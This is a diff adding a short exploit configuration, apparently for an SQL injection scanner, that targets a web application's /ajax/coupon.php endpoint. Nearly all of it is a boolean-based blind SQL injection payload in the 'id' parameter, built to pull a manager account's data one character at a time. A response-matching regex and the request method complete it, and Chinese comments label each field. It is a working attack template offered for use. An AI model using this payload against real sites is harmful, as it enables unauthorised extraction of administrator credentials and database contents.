@@ -1,0 +1,8 @@
+[exploit]
+path=/ajax/coupon.php?
+#测试的payload
+payload=action=consume&id=--9876')%20or%20exists(select%20*%20from%20user%20where%20manager='Y'%20and%20ord(substring($param,$i,1))>$count%20and%20id=1%20order%20by%20id%20desc%20limit%201)--%20sdf
+#返回结果匹配的正则
+res_match=\^\w+:\w+
+#请求的方式
+method = get
